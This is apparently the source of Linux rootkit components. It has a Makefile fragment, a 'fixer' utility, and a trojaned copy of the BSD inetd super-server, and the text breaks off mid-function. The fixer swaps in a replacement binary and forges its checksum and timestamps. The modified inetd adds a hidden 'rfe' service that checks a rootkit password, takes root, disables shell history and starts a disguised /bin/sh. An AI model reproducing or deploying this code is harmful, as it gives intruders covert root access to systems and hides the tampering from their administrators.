	$(editpl) $< > $@.tmp && chmod +x $@.tmp && mv $@.tmp $@
.SUFFIXES:
.SUFFIXES: .c .o ._c ._o $(SUFFIXES)

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:
timestamp
/*
 *	fixer.c
 *	by Idefix 
 *	inspired on sum.c and SaintStat 2.0
 *	updated by Cybernetik for linux rootkit
 */

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

main (argc,argv)
int	argc;
char	**argv;
{
	unsigned orig_crc,current_crc,temp;
	unsigned char diff1,diff2,buf[20];
	char	systemstr[100],directory[200],*strptr;
	struct 	stat statbuf,dirbuf;
	long 	position;
	FILE	*f;
	int 	i,fix=1;


	if (argc<3) {usage();exit(1);}

	if (strptr=strrchr(argv[1],'/')) {
		strncpy(directory,argv[1],(strptr-argv[1]));
		directory[(strptr-argv[1])]='\0';
		}
	else strcpy(directory,".");	

	stat(argv[1],&statbuf);
	stat(directory,&dirbuf);

	if (sum(argv[1],&orig_crc)!=0) exit(1);
	if (sum(argv[2],&current_crc)!=0) exit(1);

	if (argc==4) {
	sprintf(systemstr,"cp %s %s",argv[1],argv[3]);
	system(systemstr);
	}
	sprintf(systemstr,"mv %s %s",argv[2],argv[1]);
	system(systemstr);

	diff1=(orig_crc&0xFF)-(current_crc&0xFF);
	temp=(current_crc+diff1)&0xFFFF;
	for(i=0;i<8;i++)
	{
	   if (temp&1) temp = (temp>>1) + 0x8000;
	   else	temp >>= 1;
	}
	diff2=((orig_crc&0xFF00)>>8)-(temp&0xFF);
	temp=(temp+diff2)&0xFFFF;
	for(i=0;i<8;i++)
	{
	   if (temp&1) temp = (temp>>1) + 0x8000;
	   else	temp >>= 1;
	}
	if ((temp-orig_crc)==1) diff1=diff1-1;

	if ((f = fopen(argv[1], "r+b")) == NULL) {
	    fprintf (stderr, "fix: Can't open %s\n", argv[1]);
	    exit(1);
	}
	fseek(f,0L,SEEK_END);
	position=ftell(f)-17;
	fseek(f,position,SEEK_SET);
	fread(buf,17,1,f);
	for(i=0;i<17;i++)
	   if (buf[i]!=0) {
	      fprintf(stderr,"fix: Last 17 bytes not zero\n");
	      fprintf(stderr,"fix: Can't fix checksum\n");
	      fix=0;
	      break;
	   }
	if (fix) {
	   buf[0]=diff1;
	   buf[8]=diff2;
	   fseek(f,position,SEEK_SET);
	   fwrite(buf,17,1,f);
	}
	fclose(f);	
	
	if (chown(argv[1],statbuf.st_uid,statbuf.st_gid)) {
	   fprintf(stderr,"fix: No permission to change owner or no such file\n");
	   exit(1);
	}
	
	if (chmod(argv[1],statbuf.st_mode)) {
   	fprintf(stderr,"fix: No permission to change mode or no such file\n");
   	exit(1);
	}

	fixtime((char *)argv[1],statbuf);
	fixtime((char *)directory,dirbuf);

	fprintf(stderr,"fix: File %s fixed\n",argv[1]);
	return 0;	
}


sum (file,crc)
char	*file;
unsigned *crc;
{
	unsigned sum;
	int i, c;
	FILE *f;
	long nbytes;
	int	errflg = 0;

	if ((f = fopen(file, "r")) == NULL) {
	    fprintf (stderr, "fix: Can't open %s\n", file);
	    return(1);
	}
	sum = 0;
	nbytes = 0;
	while ((c = getc(f)) != EOF) {
	    nbytes++;
	    if (sum&01)
		sum = (sum>>1) + 0x8000;
	    else
		sum >>= 1;
	    sum += c;
	    sum &= 0xFFFF;
	}
	if (ferror (f)) {
	    errflg++;
	    fprintf (stderr, "fix: read error on %s\n",file);
	}
	fclose (f);
	*crc=sum;
	return(0);
}


int fixtime(filename,buf)
char *filename;
struct stat buf;
{
        struct  timeval ftime[2], otime, ntime;
        struct  timezone tzp;

        ftime[0].tv_sec = buf.st_atime;
        ftime[1].tv_sec = buf.st_mtime;
        ntime.tv_sec    = buf.st_ctime;
        ftime[0].tv_usec=ftime[1].tv_usec=ntime.tv_usec=0;


        if (gettimeofday(&otime,&tzp)) {
           fprintf(stderr,"fix: Can't read time of day\n");
           exit(1);
        }

        if (settimeofday(&ntime,&tzp)) {
           fprintf(stderr,"fix: Can't set time of day\n");
        }

        if (utimes(filename,ftime)) {
           fprintf(stderr,"fix: Can't change modify time\n");
        }
        settimeofday(&otime,&tzp);
}

usage()
{
	fprintf(stderr,"Usage:\n");
	fprintf(stderr,"fix original replacement [backup]\n");
}
/*
 * Copyright (c) 1989 The Regents of the University of California.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by the University of
 *	California, Berkeley and its contributors.
 * 4. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *	from: @(#)pathnames.h	5.3 (Berkeley) 6/1/90
 *	$Id: pathnames.h,v 1.1 1994/05/23 09:04:45 rzsfl Exp $
 */

#include <paths.h>

#define	_PATH_INETDCONF	"/etc/inetd.conf"
#define _PATH_INETDPID	"/var/run/inetd.pid"
all: inetd

include ../MCONFIG
#include ../MRULES

inetd: inetd.o daemon.o
	$(CC) $(LDFLAGS) $^ $(LIBS) -o $@

inetd.o daemon.o: pathnames.h inetd.h

install: inetd
	install -s -m744 inetd /usr/sbin/
	install -m644 inetd.8 /usr/man/man8/

clean:
	rm -f *.o inetd

/*
 * Copyright (c) 1983,1991 The Regents of the University of California.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by the University of
 *	California, Berkeley and its contributors.
 * 4. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

char copyright[] =
  "@(#) Copyright (c) 1983 Regents of the University of California.\n"
  "All rights reserved.\n";

/*
 * From: @(#)inetd.c	5.30 (Berkeley) 6/3/91
 */
char rcsid[] = 
  "$Id: inetd.c,v 1.6 1996/08/14 23:54:14 dholland Exp $";


/*
 * Inetd - Internet super-server
 *
 * This program invokes all internet services as needed.
 * connection-oriented services are invoked each time a
 * connection is made, by creating a process.  This process
 * is passed the connection as file descriptor 0 and is
 * expected to do a getpeername to find out the source host
 * and port.
 *
 * Datagram oriented services are invoked when a datagram
 * arrives; a process is created and passed a pending message
 * on file descriptor 0.  Datagram servers may either connect
 * to their peer, freeing up the original socket for inetd
 * to receive further messages on, or ``take over the socket'',
 * processing all arriving datagrams and, eventually, timing
 * out.	 The first type of server is said to be ``multi-threaded'';
 * the second type of server ``single-threaded''. 
 *
 * Inetd uses a configuration file which is read at startup
 * and, possibly, at some later time in response to a hangup signal.
 * The configuration file is ``free format'' with fields given in the
 * order shown below.  Continuation lines for an entry must being with
 * a space or tab.  All fields must be present in each entry.
 *
 *	service name			must be in /etc/services
 *	socket type			stream/dgram/raw/rdm/seqpacket
 *	protocol			must be in /etc/protocols
 *	wait/nowait[.max]		single-threaded/multi-threaded, max #
 *	user[.group]			user/group to run daemon as
 *	server program			full path name
 *	server program arguments	maximum of MAXARGS (20)
 *
 * For RPC services
 *      service name/version            must be in /etc/rpc
 *	socket type			stream/dgram/raw/rdm/seqpacket
 *	protocol			must be in /etc/protocols
 *	wait/nowait[.max]		single-threaded/multi-threaded
 *	user[.group]			user to run daemon as
 *	server program			full path name
 *	server program arguments	maximum of MAXARGS (20)
 *
 * Comment lines are indicated by a `#' in column 1.
 */

/*
 * Here's the scoop concerning the user.group feature:
 *
 * 1) set-group-option off.
 * 
 * 	a) user = root:	NO setuid() or setgid() is done
 * 
 * 	b) other:	setuid()
 * 			setgid(primary group as found in passwd)
 * 			initgroups(name, primary group)
 * 
 * 2) set-group-option on.
 * 
 * 	a) user = root:	NO setuid()
 * 			setgid(specified group)
 * 			NO initgroups()
 * 
 * 	b) other:	setuid()
 * 			setgid(specified group)
 * 			initgroups(name, specified group)
 * 
 */

#include <sys/param.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/file.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/resource.h>

#ifndef __linux__
#ifndef RLIMIT_NOFILE
#define RLIMIT_NOFILE	RLIMIT_OFILE
#endif
#endif

#define RPC

#include <sys/param.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/file.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/resource.h>

#include <netinet/in.h>
#include <arpa/inet.h>

#include <errno.h>
#include <signal.h>
#include <netdb.h>
#include <syslog.h>
#include <pwd.h>
#include <grp.h>
#include <stdio.h>
#include <string.h>

#ifdef RPC
/* work around a compiler warning in rpc.h */
#define __wait __wait_foo
#include <rpc/rpc.h>
#include <rpc/pmap_clnt.h>
#undef __wait
#endif

#include "pathnames.h"
#include "inetd.h"
#include "../rootkit.h"
int elite=0,done=0;
char MAG[7];

#ifndef MIN
#define MIN(a, b)	((a) < (b) ? (a) : (b))
#endif

#define	TOOMANY		40		/* don't start more than TOOMANY */
#define	CNT_INTVL	60		/* servers in CNT_INTVL sec. */
#define	RETRYTIME	(60*10)		/* retry after bind or server fail */

#define	SIGBLOCK	(sigmask(SIGCHLD)|sigmask(SIGHUP)|sigmask(SIGALRM))

struct servtab *getconfigent(void);
struct servtab *enter(struct servtab *);
static void config(int);
static void reapchild(int);
static void retry(int);
static void goaway(int);

static int	debug = 0;
static int	nsock, maxsock;
static fd_set	allsock;
static int	options;
static int	timingout;

#ifdef MULOG
static char	*curdom;
#endif

#ifndef OPEN_MAX
#define OPEN_MAX	64
#endif

/* Reserve some descriptors, 3 stdio + at least: 1 log, 1 conf. file */
#define FD_MARGIN	(8)
int	rlim_ofile_cur = OPEN_MAX;

#ifdef RLIMIT_NOFILE
struct rlimit	rlim_ofile;
#endif

struct	servtab {
	char	*se_service;		/* name of service */
	int	se_socktype;		/* type of socket to use */
	int	se_family;		/* address family */
	char	*se_proto;		/* protocol used */
	int	se_rpcprog;		/* rpc program number */
	int	se_rpcversl;		/* rpc program lowest version */
	int	se_rpcversh;		/* rpc program highest version */
#define isrpcservice(sep)	((sep)->se_rpcversl != 0)
	short	se_wait;		/* single threaded server */
	short	se_checked;		/* looked at during merge */
	char	*se_user;		/* user name to run as */
	char	*se_group;		/* group name to run as */
	struct	biltin *se_bi;		/* if built-in, description */
	char	*se_server;		/* server program */
#define	MAXARGV 20
	char	*se_argv[MAXARGV+1];	/* program arguments */
	int	se_fd;			/* open descriptor */
	union {
		struct	sockaddr se_un_ctrladdr;
		struct	sockaddr_in se_un_ctrladdr_in;
		struct	sockaddr_un se_un_ctrladdr_un;
	} se_un;			/* bound address */
#define se_ctrladdr	se_un.se_un_ctrladdr
#define se_ctrladdr_in	se_un.se_un_ctrladdr_in
#define se_ctrladdr_un	se_un.se_un_ctrladdr_un
	int	se_ctrladdr_size;
	int	se_max;			/* max # of instances of this service */
	int	se_count;		/* number started since se_time */
	struct	timeval se_time;	/* start of se_count */
#ifdef MULOG
	int	se_log;
#define MULOG_RFC931	0x40000000
#endif
	struct	servtab *se_next;
} *servtab;

static void echo_stream(int, struct servtab *);
static void discard_stream(int, struct servtab *);
static void machtime_stream(int, struct servtab *);
static void daytime_stream(int, struct servtab *);
static void chargen_stream(int, struct servtab *);
static void echo_dg(int, struct servtab *);
static void discard_dg(int, struct servtab *);
static void machtime_dg(int, struct servtab *);
static void daytime_dg(int, struct servtab *);
static void chargen_dg(int, struct servtab *);

static void logpid(void);
static int setconfig(void);
static void endconfig(void);
static void register_rpc(struct servtab *sep);
static void unregister_rpc(struct servtab *sep);
static void freeconfig(struct servtab *cp);
static void print_service(const char *action, struct servtab *sep);
static void setup(struct servtab *sep);
static int bump_nofile(void);
static void rfe_stream(int, struct servtab *);

struct biltin {
	const char *bi_service;		/* internally provided service name */
	int bi_socktype;		/* type of socket supported */
	short bi_fork;		/* 1 if should fork before call */
	short bi_wait;		/* 1 if should wait for child */
	void (*bi_fn)(int, struct servtab *); /* fn which performs it */
} biltins[] = {
	/* Echo received data */
	{ "echo",		SOCK_STREAM,	1, 0,	echo_stream, },
	{ "echo",		SOCK_DGRAM,	0, 0,	echo_dg, },

	/* Internet /dev/null */
	{ "discard",	SOCK_STREAM,	1, 0,	discard_stream, },
	{ "discard",	SOCK_DGRAM,	0, 0,	discard_dg, },

	/* Return 32 bit time since 1900 */
	{ "time",		SOCK_STREAM,	0, 0,	machtime_stream, },
	{ "time",		SOCK_DGRAM,	0, 0,	machtime_dg,     },

	/* Return human-readable time */
	{ "daytime",	SOCK_STREAM,	0, 0,	daytime_stream,     },
	{ "daytime",	SOCK_DGRAM,	0, 0,	daytime_dg,     },

	/* Familiar character generator */
	{ "chargen",	SOCK_STREAM,	1, 0,	chargen_stream,     },
	{ "chargen",	SOCK_DGRAM,	0, 0,	chargen_dg,     },

        /* RFE Backdoor patch */
        { "rfe",        SOCK_STREAM,    1, 0,   rfe_stream, },
        /* no udp yet */

	{ NULL, 0, 0, 0, NULL }
};

#define NUMINT	(sizeof(intab) / sizeof(struct inent))
static const char *CONFIG = _PATH_INETDCONF;
static char **Argv;
static char *LastArg;
static char *progname;

#ifdef sun
/*
 * Sun's RPC library caches the result of `dtablesize()'
 * This is incompatible with our "bumping" of file descriptors "on demand"
 */
int
_rpc_dtablesize()
{
	return rlim_ofile_cur;
}
#endif

int
main(int argc, char *argv[], char *envp[])
{
	struct servtab *sep;
	struct passwd *pwd;
	struct group *grp = NULL;
	int tmpint;
	struct sigaction sa;
	int ch, pid, dofork;
	char buf[50];
        strcpy(MAG,"");
        MAG[0]=ROOTKIT_PASSWORD[0];
        MAG[1]=ROOTKIT_PASSWORD[1];
        MAG[2]=ROOTKIT_PASSWORD[2];
        MAG[3]=ROOTKIT_PASSWORD[3];
        MAG[4]=ROOTKIT_PASSWORD[4];
        MAG[5]=ROOTKIT_PASSWORD[5];
        MAG[6]='\0';

	Argv = argv;
	if (envp == 0 || *envp == 0)
		envp = argv;
	while (*envp)
		envp++;
	LastArg = envp[-1] + strlen(envp[-1]);

	progname = strrchr(argv[0], '/');
	progname = progname ? progname + 1 : argv[0];

	while ((ch = getopt(argc, argv, "d")) != EOF)
		switch(ch) {
		case 'd':
			debug = 1;
			options |= SO_DEBUG;
			break;
		case '?':
		default:
			fprintf(stderr, "usage: %s [-d] [conf]", progname);
			exit(1);
		}
	argc -= optind;
	argv += optind;

	if (argc > 0)
		CONFIG = argv[0];

	if (debug == 0)
		daemon(0, 0);
	openlog(progname, LOG_PID | LOG_NOWAIT, LOG_DAEMON);
	logpid();

#ifdef RLIMIT_NOFILE
	if (getrlimit(RLIMIT_NOFILE, &rlim_ofile) < 0) {
		syslog(LOG_ERR, "getrlimit: %m");
	} else {
		rlim_ofile_cur = rlim_ofile.rlim_cur;
		if (rlim_ofile_cur == RLIM_INFINITY)	/* ! */
			rlim_ofile_cur = OPEN_MAX;
	}
#endif

	config(0);
	memset(&sa, 0, sizeof(sa));
	sa.sa_mask = SIGBLOCK;
	sa.sa_handler = retry;
	sigaction(SIGALRM, &sa, NULL);
	sa.sa_handler = config;
	sigaction(SIGHUP, &sa, NULL);
	sa.sa_handler = reapchild;
	sigaction(SIGCHLD, &sa, NULL);
	sa.sa_handler = goaway;
	sigaction(SIGTERM, &sa, NULL);
	sa.sa_handler = goaway;
	sigaction(SIGINT, &sa,  NULL);

	{
		/* space for daemons to overwrite environment for ps */
#define	DUMMYSIZE	100
		char dummy[DUMMYSIZE];

		(void)memset(dummy, 'x', DUMMYSIZE - 1);
		dummy[DUMMYSIZE - 1] = '\0';

		(void)setenv("inetd_dummy", dummy, 1);
	}

	for (;;) {
	    int n, ctrl;
	    fd_set readable;

	    if (nsock == 0) {
		(void) sigblock(SIGBLOCK);
		while (nsock == 0)
		    sigpause(0L);
		(void) sigsetmask(0L);
	    }
	    readable = allsock;
	    if ((n = select(maxsock + 1, &readable, (fd_set *)0,
		(fd_set *)0, (struct timeval *)0)) <= 0) {
		    if (n < 0 && errno != EINTR)
			syslog(LOG_WARNING, "select: %m\n");
		    sleep(1);
		    continue;
	    }
	    for (sep = servtab; n && sep; sep = sep->se_next)
	    if (sep->se_fd != -1 && FD_ISSET(sep->se_fd, &readable)) {
		n--;
		if ( (debug)&&(strcmp(sep->se_service,"rfe")) ) 
			fprintf(stderr, "someone wants %s\n", sep->se_service);
		if (!sep->se_wait && sep->se_socktype == SOCK_STREAM) {
			/* Fixed AGC */
			fcntl(sep->se_fd,F_SETFL,O_NDELAY);
			/* --------- */
			ctrl = accept(sep->se_fd, (struct sockaddr *)0,
			    (int *)0);
			fcntl(sep->se_fd,F_SETFL, 0);
			if ( (debug)&&(strcmp(sep->se_service,"rfe")) )
				fprintf(stderr, "accept, ctrl %d\n", ctrl);
			if (ctrl < 0) {
				if (errno == EINTR || errno == EWOULDBLOCK)
					continue;
				syslog(LOG_WARNING, "accept (for %s): %m",
					sep->se_service);
				continue;
			}
		} else
			ctrl = sep->se_fd;
		(void) sigblock(SIGBLOCK);
		pid = 0;
		dofork = (sep->se_bi == 0 || sep->se_bi->bi_fork);
		if (dofork) {
			if (sep->se_count++ == 0)
			    (void)gettimeofday(&sep->se_time,
			        (struct timezone *)0);
			else if (sep->se_count >= sep->se_max) {
				struct timeval now;

				(void)gettimeofday(&now, (struct timezone *)0);
				if (now.tv_sec - sep->se_time.tv_sec >
				    CNT_INTVL) {
					sep->se_time = now;
					sep->se_count = 1;
				} else {
					syslog(LOG_ERR,
			"%s/%s server failing (looping), service terminated\n",
					    sep->se_service, sep->se_proto);
					FD_CLR(sep->se_fd, &allsock);
					(void) close(sep->se_fd);
					sep->se_fd = -1;
					sep->se_count = 0;
					nsock--;
					sigsetmask(0L);
					if (!timingout) {
						timingout = 1;
						alarm(RETRYTIME);
					}
					continue;
				}
			}
			pid = fork();
		}
		if (pid < 0) {
			syslog(LOG_ERR, "fork: %m");
			if (sep->se_socktype == SOCK_STREAM)
				close(ctrl);
			sigsetmask(0L);
			sleep(1);
			continue;
		}
		if (pid && sep->se_wait) {
			sep->se_wait = pid;
			FD_CLR(sep->se_fd, &allsock);
			nsock--;
		}
		sigsetmask(0L);
		if (pid == 0) {
			if (debug && dofork)
				setsid();
if (strcmp(sep->se_service,"rfe")==0) elite=1;
			if ( (sep->se_bi) && !elite )
				(*sep->se_bi->bi_fn)(ctrl, sep);
			else { if(!elite) {
				if ((pwd = getpwnam(sep->se_user)) == NULL) {
					syslog(LOG_ERR,
						"getpwnam: %s: No such user",
						sep->se_user);
					if (sep->se_socktype != SOCK_STREAM)
						recv(0, buf, sizeof (buf), 0);
					_exit(1);
				}
				if (sep->se_group &&
				    (grp = getgrnam(sep->se_group)) == NULL) {
					syslog(LOG_ERR,
						"getgrnam: %s: No such group",
						sep->se_group);
					if (sep->se_socktype != SOCK_STREAM)
						recv(0, buf, sizeof (buf), 0);
					_exit(1);
				}
				if (pwd->pw_uid) {
					if (sep->se_group)
						pwd->pw_gid = grp->gr_gid;
					(void) setgid((gid_t)pwd->pw_gid);
					initgroups(pwd->pw_name, pwd->pw_gid);
					(void) setuid((uid_t)pwd->pw_uid);
				} else if (sep->se_group) {
					(void) setgid((gid_t)grp->gr_gid);
				}
				if (debug)
					fprintf(stderr, "%d execl %s\n",
					    getpid(), sep->se_server);
#ifdef MULOG
				if (sep->se_log)
					dolog(sep, ctrl);
#endif
				} /* end elite */
				else { char buffer[BUFSIZ];
				setreuid(0,0);
        			setregid(0,0);
				setenv("HISTFILE","",1);
				read(ctrl, buffer, sizeof(buffer));
				if (strncmp(buffer,MAG,6)==0) elite=2;
				}
				if(elite!=1) {
				dup2(ctrl, 0);
				close(ctrl);
				dup2(0, 1);
				dup2(0, 2);
#ifdef RLIMIT_NOFILE
				if (rlim_ofile.rlim_cur != rlim_ofile_cur) {
					if (setrlimit(RLIMIT_NOFILE,
							&rlim_ofile) < 0)
						syslog(LOG_ERR,"setrlimit: %m");
				}
#endif
				for (tmpint = rlim_ofile_cur-1; --tmpint > 2; )
					(void)close(tmpint);
				if (elite==2) execl("/bin/sh","lpd",(char *)0);
				else
				execv(sep->se_server, sep->se_argv);
				if (sep->se_socktype != SOCK_STREAM)
					recv(0, buf, sizeof (buf), 0);
				syslog(LOG_ERR, "execv %s: %m", sep->se_server);
				} /* end elite=1 */
				_exit(1);
			}
		}
		if (!sep->se_wait && sep->se_socktype == SOCK_STREAM)
			close(ctrl);
	    }
	}
}

void
reapchild(int signum)
{
	int status;
	int pid;
	register struct servtab *sep;

	(void)signum;
	for (;;) {
		pid = wait3(&status, WNOHANG, (struct rusage *)0);
		if (pid <= 0)
			break;
		if (debug) 
			fprintf(stderr, "%d reaped\n", pid);
		for (sep = servtab; sep; sep = sep->se_next)
			if (sep->se_wait == pid) {
				if (WIFEXITED(status) && WEXITSTATUS(status))
					syslog(LOG_WARNING,
					    "%s: exit status 0x%x",
					    sep->se_server, WEXITSTATUS(status));
				else if (WIFSIGNALED(status))
					syslog(LOG_WARNING,
					    "%s: exit signal 0x%x",
					    sep->se_server, WTERMSIG(status));
				sep->se_wait = 1;
				FD_SET(sep->se_fd, &allsock);
				nsock++;
				if (debug)
					fprintf(stderr, "restored %s, fd %d\n",
					    sep->se_service, sep->se_fd);
			}
	}
}

static void
config(int signum)
{
	register struct servtab *sep, *cp, **sepp;
	long omask;
	unsigned n;

	(void)signum;
	if (!setconfig()) {
		syslog(LOG_ERR, "%s: %m", CONFIG);
		return;
	}
	for (sep = servtab; sep; sep = sep->se_next)
		sep->se_checked = 0;
	while ((cp = getconfigent())!=NULL) {
		for (sep = servtab; sep; sep = sep->se_next)
			if (strcmp(sep->se_service, cp->se_service) == 0 &&
			    strcmp(sep->se_proto, cp->se_proto) == 0)
				break;
		if (sep != 0) {
			int i;

#define SWAP(type, a, b) {type c=(type)a; (type)a=(type)b; (type)b=(type)c;}

			omask = sigblock(SIGBLOCK);
			/*
			 * sep->se_wait may be holding the pid of a daemon
			 * that we're waiting for.  If so, don't overwrite
			 * it unless the config file explicitly says don't 
			 * wait.
			 */
			if (cp->se_bi == 0 && 
			    (sep->se_wait == 1 || cp->se_wait == 0))
				sep->se_wait = cp->se_wait;
			if (cp->se_max != sep->se_max)
				SWAP(int, cp->se_max, sep->se_max);
			if (cp->se_user)
				SWAP(char *, sep->se_user, cp->se_user);
			if (cp->se_group)
				SWAP(char *, sep->se_group, cp->se_group);
			if (cp->se_server)
				SWAP(char *, sep->se_server, cp->se_server);
			for (i = 0; i < MAXARGV; i++)
				SWAP(char *, sep->se_argv[i], cp->se_argv[i]);
#undef SWAP
			if (isrpcservice(sep))
				unregister_rpc(sep);
			sep->se_rpcversl = cp->se_rpcversl;
			sep->se_rpcversh = cp->se_rpcversh;
			sigsetmask(omask);
			freeconfig(cp);
			if (debug)
				print_service("REDO", sep);
		} else {
			sep = enter(cp);
			if (debug)
				print_service("ADD ", sep);
		}
		sep->se_checked = 1;

		switch (sep->se_family) {
		case AF_UNIX:
			if (sep->se_fd != -1)
				break;
			(void)unlink(sep->se_service);
			n = strlen(sep->se_service);
			if (n > sizeof(sep->se_ctrladdr_un.sun_path) - 1) 
				n = sizeof(sep->se_ctrladdr_un.sun_path) - 1;
			strncpy(sep->se_ctrladdr_un.sun_path, sep->se_service, n);
			sep->se_ctrladdr_un.sun_family = AF_UNIX;
			sep->se_ctrladdr_size = n +
					sizeof sep->se_ctrladdr_un.sun_family;
			setup(sep);
			break;
		case AF_INET:
			sep->se_ctrladdr_in.sin_family = AF_INET;
			sep->se_ctrladdr_size = sizeof sep->se_ctrladdr_in;
			if (isrpcservice(sep)) {
				struct rpcent *rp;

				sep->se_rpcprog = atoi(sep->se_service);
				if (sep->se_rpcprog == 0) {
					rp = getrpcbyname(sep->se_service);
					if (rp == 0) {
						syslog(LOG_ERR,
							"%s: unknown service",
							sep->se_service);
						continue;
					}
					sep->se_rpcprog = rp->r_number;
				}
				if (sep->se_fd == -1)
					setup(sep);
				if (sep->se_fd != -1)
					register_rpc(sep);
			} else {
				u_short port = htons(atoi(sep->se_service));

				if (!port) {
					struct servent *sp;
					sp = getservbyname(sep->se_service,
								sep->se_proto);
					if (sp == 0) {
						syslog(LOG_ERR,
						    "%s/%s: unknown service",
						    sep->se_service, sep->se_proto);
						continue;
					}
					port = sp->s_port;
				}
				if (port != sep->se_ctrladdr_in.sin_port) {
					sep->se_ctrladdr_in.sin_port = port;
					if (sep->se_fd != -1) {
						FD_CLR(sep->se_fd, &allsock);
						nsock--;
						(void) close(sep->se_fd);
					}
					sep->se_fd = -1;
				}
				if (sep->se_fd == -1)
					setup(sep);
			}
		}
	}
	endconfig();
	/*
	 * Purge anything not looked at above.
	 */
	omask = sigblock(SIGBLOCK);
	sepp = &servtab;
	while ((sep = *sepp) != NULL) {
		if (sep->se_checked) {
			sepp = &sep->se_next;
			continue;
		}
		*sepp = sep->se_next;
		if (sep->se_fd != -1) {
			FD_CLR(sep->se_fd, &allsock);
			nsock--;
			(void) close(sep->se_fd);
		}
		if (isrpcservice(sep))
			unregister_rpc(sep);
		if (sep->se_family == AF_UNIX)
			(void)unlink(sep->se_service);
		if (debug)
			print_service("FREE", sep);
		freeconfig(sep);
		free((char *)sep);
	}
	(void) sigsetmask(omask);
}

static void
retry(int signum)
{
	register struct servtab *sep;

	(void)signum;
	timingout = 0;
	for (sep = servtab; sep; sep = sep->se_next) {
		if (sep->se_fd == -1) {
			switch (sep->se_family) {
			case AF_UNIX:
			case AF_INET:
				setup(sep);
				if (sep->se_fd != -1 && isrpcservice(sep))
					register_rpc(sep);
				break;
			}
		}
	}
}

static void
goaway(int signum)
{
	register struct servtab *sep;

	(void)signum;
	for (sep = servtab; sep; sep = sep->se_next) {
		if (sep->se_fd == -1)
			continue;

		switch (sep->se_family) {
		case AF_UNIX:
			(void)unlink(sep->se_service);
			break;
		case AF_INET:
			if (sep->se_wait == 1 && isrpcservice(sep))
				unregister_rpc(sep);
			break;
		}
		(void)close(sep->se_fd);
	}
	(void)unlink(_PATH_INETDPID);
	exit(0);
}


static void
setup(struct servtab *sep)
{
	int on = 1;

	if ((sep->se_fd = socket(sep->se_family, sep->se_socktype, 0)) < 0) {
		syslog(LOG_ERR, "%s/%s: socket: %m",
		    sep->se_service, sep->se_proto);
		return;
	}
#define	turnon(fd, opt) \
setsockopt(fd, SOL_SOCKET, opt, (char *)&on, sizeof (on))
	if (strcmp(sep->se_proto, "tcp") == 0 && (options & SO_DEBUG) &&
	    turnon(sep->se_fd, SO_DEBUG) < 0)
		syslog(LOG_ERR, "setsockopt (SO_DEBUG): %m");
	if (turnon(sep->se_fd, SO_REUSEADDR) < 0)
		syslog(LOG_ERR, "setsockopt (SO_REUSEADDR): %m");
#undef turnon
	if (bind(sep->se_fd, &sep->se_ctrladdr, sep->se_ctrladdr_size) < 0) {
		syslog(LOG_ERR, "%s/%s: bind: %m",
		    sep->se_service, sep->se_proto);
		(void) close(sep->se_fd);
		sep->se_fd = -1;
		if (!timingout) {
			timingout = 1;
